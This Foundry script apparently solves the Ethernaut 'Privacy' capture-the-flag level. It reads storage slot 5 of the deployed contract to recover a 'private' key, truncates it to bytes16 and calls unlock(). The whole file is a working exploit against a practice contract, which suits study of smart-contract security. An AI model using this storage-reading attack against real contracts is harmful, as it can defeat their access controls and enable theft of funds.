// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "src/Privacy.sol";
import "forge-std/console.sol";

contract PrivacyUnlock is Script {
    function run() external {

        address privacyAddress = 0xB73242850526BD0bC9a115DeC75a1354888de8Af;

        vm.startBroadcast();

        bytes32 key = vm.load(privacyAddress, bytes32(uint256(5)));

        Privacy privacyInstance = Privacy(privacyAddress);
        console.log("Privacy contract address:", address(privacyInstance));

        privacyInstance.unlock(bytes16(key));
        console.log("Privacy contract unlocked:", !privacyInstance.locked());

        vm.stopBroadcast();
    }
}
